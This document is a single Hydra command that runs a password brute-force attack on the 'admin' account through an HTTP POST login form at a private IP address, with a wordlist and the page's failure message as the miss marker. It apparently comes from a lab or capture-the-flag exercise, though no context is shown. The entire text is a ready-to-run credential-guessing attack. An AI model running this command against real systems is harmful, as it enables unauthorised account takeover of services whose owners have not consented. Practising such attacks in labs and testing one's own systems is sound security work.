hydra -l admin -P wordlist.txt 10.103.203.58 http-post-form "/login:username=^USER^&password=^PASS^:Bad credentials! Try again"
